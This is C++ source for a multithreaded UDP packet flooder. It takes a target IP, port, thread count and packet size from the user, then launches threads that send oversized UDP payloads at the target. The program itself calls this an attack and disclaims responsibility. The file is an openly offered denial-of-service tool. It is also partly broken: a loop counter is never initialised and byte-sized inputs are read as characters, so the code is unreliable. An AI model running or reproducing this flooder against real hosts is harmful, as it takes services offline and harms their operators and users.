#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <memory.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <errno.h>
#include <stdlib.h>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <linux/version.h>
#include <sys/utsname.h>
#include <limits>
#include <thread>
#include "module/linux.cpp"
#include "module/sentpacket.cpp"

using namespace std;

const std::string compilation_date = __DATE__;
const std::string compilation_time = __TIME__;
std::string ip;
std::uint16_t port;
std::uint8_t threads;
std::uint8_t kb;
std::string msg("");
void task1()
    {
        // Import sendpacket.cpp //
        attackudp attack;
        attack.send(ip, port, msg);
    }
int main() {
    
    // Import linux.cpp //
    linux_kernel kernelinfo;

    printf("=== Linux Kernel Information ===\n");
    kernelinfo.kernelos();  
    kernelinfo.kernelarch();
    kernelinfo.kernelversion();
    printf("=== END ===\n");
    cout << "THIS PROGRAM IS BUILD IN DATE: " << compilation_date << " " << compilation_time << endl;
    cout << "UDP Packet Generators by randomladyboyguy\n";
    cout << "Orinigal Fork: fusedevgithub (Discontinued)\n";
    cout << "If something is wrong please report the issues to github.\n";
    cout << "IP Address: ";
    cin >> ip;
    cout << "Port: ";
    cin >> port;
    cout << "Target is: IP: " << ip << " Port: " << port << endl;
    cout << "WARNING: THIS ATTACKING IS MADE BY YOU! PLEASE DO THIS WITH YOUR OWN RISK!\nIF YOU NEED CANCEL THIS PLEASE PRESS CTRL+C FOR CLOSE THIS PROGRAM.\n";
    cout << "Threads: ";
    cin >> threads;
    cout << "KB (Recommendeds: 512): ";
    cin >> kb;
    cout << "\nAsking again: KB (Recommendeds: 512): ";
    cin >> kb;
    cout << "\nGenerating KB (Size)....\n";
for (int i; i < 1024 * kb; i++){
msg = msg + "x"; // DO NOT DOUBLE IT OR CHANGE IT BECAUSE THAT MAYBE BROKEN BYTE OF PACKET TO -1 BYTES!
}
    cout << "Creating task...\n";
    
    std::vector<std::thread> t;
for(int i=0; i < threads; i ++){
    std::thread th = std::thread([](){ task1(); });
    t.push_back(std::move(th));
    std::cout<<"Thread started"<<std::endl;
    }

for(auto& th : t){ 
    th.join();
}
}
